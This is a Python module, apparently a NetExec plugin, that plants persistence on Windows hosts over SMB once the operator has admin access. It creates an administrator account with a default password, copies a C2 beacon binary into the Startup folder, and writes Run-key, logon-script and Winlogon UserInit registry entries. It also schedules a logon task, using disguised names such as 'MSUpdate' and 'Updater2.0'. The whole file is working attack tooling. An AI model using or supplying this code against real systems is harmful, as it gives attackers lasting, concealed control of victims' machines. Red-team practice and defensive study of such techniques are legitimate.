#!/usr/bin/env python3
# -*- coding: utf-8 -*-  # noqa: UP009

from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations


class NXCModule:
    """
    Implements persistence techniques used by APTs and Red Teamers/Pentesters.
    
    Created by Lorenzo Meacci @kapla, founder of the 0xH3xSec community!
    """

    name = 'persistence'
    description = "Implements techniques for persistence used by malicious actors"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        TECHNIQUE: String specifying the persistence technique to use.
        Supported techniques:
        1. 'add_user' - Adds a new user/admin to the machine.
        2. 'malicious_binary' - Puts a malicious binary (e.g., C2 Beacon) in the startup folder.
        3. 'registry_run' - Modifies the Registry run key to launch the C2 Beacon.
        4. 'logon_script' - Sets a logon script at boot via the registry.
        5. 'scheduled_task' - Creates a task that triggers at logon.
        6. 'win_logon_userinit' - Modifies the "UserInit" registry value in WinLogon.
        """
        self.TECHNIQUE = module_options["TECHNIQUE"]
        self.BINARY = "Do_not_execute"
        self.user = "kapla2"
        self.password = "Join_The_0xH3xSec_Community!"
        if 'USER' in module_options:
            self.user = module_options['USER']
        if 'PASS' in module_options:
            self.password = module_options['PASS']
        if 'BINARY' in module_options:
            self.BINARY = module_options['BINARY']

    def on_admin_login(self, context, connection):
         # Check TECHNIQUE and execute add_user if specified 
        if self.TECHNIQUE == "add_user":
            self.add_user(context, connection)
            
        elif self.TECHNIQUE == "malicious_binary":
            if self.BINARY != "Do_not_execute":
                self.malicious_binary(context , connection)
            else:
                context.log.error("You need to specify the BINARY path!!!")
        elif self.TECHNIQUE == "registry_run":
            if self.BINARY != "Do_not_execute":
                self.registry_run(context , connection)
            else:
                context.log.error("You need to specify the BINARY path!!!")
        elif self.TECHNIQUE == "logon_script":
            if self.BINARY != "Do_not_execute":
                self.logon_script(context , connection)
            else:
                context.log.error("You need to specify the BINARY path!!!")
        elif self.TECHNIQUE == "scheduled_task":
            if self.BINARY != "Do_not_execute":
                self.scheduled_task(context , connection)
            else:
                context.log.error("You need to specify the BINARY path!!!")      
        elif self.TECHNIQUE == "win_logon_userinit":
            if self.BINARY != "Do_not_execute":
                self.win_logon_userinit(context , connection)
            else:
                context.log.error("You need to specify the BINARY path!!!")

    def add_user(self, context, connection):
        """
        Adds a new user to the Admin group.
        """
        if self.user == "kapla2" and self.password == "Join_The_0xH3xSec_Community!":
                context.log.highlight("No credentials were submitted!!! Using default user and default password!!!")
        context.log.highlight(f'Adding user {self.user}:{self.password} to the Admin group.')
        command = f'(net user {self.user} "{self.password}" /add /Y && net localgroup administrators {self.user} /add)'
        output = connection.execute(command, True)
        context.log.highlight(output)

    def malicious_binary(self, context, connection):
        """
        Puts a malicious binary in the startup folder.
        """
        command = f'copy {self.BINARY} "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
        context.log.highlight(f'Adding {self.BINARY} to the Start-Up folder.')
        output = connection.execute(command, True)
        context.log.highlight(output)

    def registry_run(self, context, connection):
        """
        Modifies the Registry Run key to launch the specified binary.
        """
        try:
            context.log.highlight(f'Adding {self.BINARY} to the "Run" registry key.')
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            # Open current user registry
            ans = rrp.hOpenCurrentUser(remoteOps._RemoteOperations__rrp)
            regHandle = ans['phKey']

            # Create or open the "Run" key
            rrp.hBaseRegCreateKey(remoteOps._RemoteOperations__rrp, regHandle, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")['phkResult']

            # Ensure the binary path (self.BINARY) is passed as bytes for the registry value data
            value_name = "MSUpdate"  # Name of the registry value (can be modified)
            value_data = self.BINARY.encode('utf-8')  # Encode the binary path as bytes
            value_type = rrp.REG_SZ  # REG_SZ is used for string values in the registry

            # Set the value in the registry
            rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, value_name, value_type, value_data)
        
            context.log.success(f'Successfully added {self.BINARY} to the "Run" registry key.')
        except Exception as e:
            context.log.error(f"Failed to modify registry: {e}")



    def logon_script(self, context, connection):
        """
        Sets a logon script in the registry to execute the specified .bat file.
        """
        try:
            context.log.highlight(f'Adding {self.BINARY} as a logon script.')
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            ans = rrp.hOpenCurrentUser(remoteOps._RemoteOperations__rrp)
            regHandle = ans['phKey']

            # Update the "UserInitMprLogonScript" value
            nice = rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, regHandle, "Environment\\UserInitMprLogonScript", rrp.REG_SZ, self.BINARY)
            context.log.highlight(nice)
            context.log.success(f'Successfully set {self.BINARY} as the logon script.')
        except Exception as e:
            context.log.error(f"Failed to modify registry: {e}")

    def scheduled_task(self, context, connection):
        """
        Creates a task that triggers at logon.
        """
        command = f'schtasks /create /sc onlogon /tn Updater2.0 /tr "{self.BINARY}"'
        context.log.highlight(f'Creating the logon task with the path: {self.BINARY}')
        output = connection.execute(command, True)
        context.log.highlight(output)

    def win_logon_userinit(self, context, connection):
        """
        Modifies the WinLogon UserInit registry key to include a binary.
        """
        try:
            context.log.highlight(f'Modifying WinLogon UserInit value to include {self.BINARY}.')
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans['phKey']

            # Navigate to the "Winlogon" key
            keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")['phkResult']

            # Modify the "UserInit" value
            userInitValue = f"C:\\Windows\\system32\\userinit.exe,{self.BINARY}"
            rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, "UserInit", rrp.REG_SZ, userInitValue + "\x00")

            context.log.success(f'Successfully modified the UserInit value: {userInitValue}')
        except Exception as e:
            context.log.error(f"Failed to modify registry: {e}")
